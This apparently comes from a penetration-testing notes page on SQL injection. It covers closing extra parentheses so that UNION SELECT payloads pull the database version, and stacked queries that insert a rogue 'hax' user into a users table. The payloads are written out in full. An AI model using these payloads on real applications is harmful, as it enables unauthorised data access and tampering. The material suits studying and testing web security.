## SQL Parser Tolerance

SQL parsers in many databases are **tolerant of extra parentheses**; they are treated as valid syntax even if they don't pair with opening parentheses. For instance, if we are testing an application that we have control of the `name` parameter and we infer that the query looks something like this:

```sql
SELECT id, name, description, price
FROM products
WHERE (name LIKE '%z%' AND active = true)
ORDER BY id ASC;
```

we can add one or more closing parentheses to account for extra nesting:

```sql
// payload
z')union+select+1,version(),3,4--+;
```

{% code overflow="wrap" %}
```sql
// results in 500
WHERE (name LIKE '%z')union+select+1,version(),3,4--+; AND active = true) ORDER BY id ASC;
```
{% endcode %}

```sql
// payload
z'))union+select+1,version(),3,4--+;
```

{% code overflow="wrap" %}
```sql
// results in 200
WHERE (name LIKE '%z'))union+select+1,version(),3,4--+; AND active = true) ORDER BY id ASC;
```
{% endcode %}

## Stacked Queries

Some RDBMS[^1]s can execute more than one query at a time: these queries are submitted simultaneously, but executed sequentially. An RDMS might execute only the first query while another execute only the last.

A common vector of exploiting stacked queries is to add, update, or delete data as these types of queries don't return results if successfully executed.

```sql
// payload
10; insert into users(id, username, password) values (1001,'hax','hax');
```
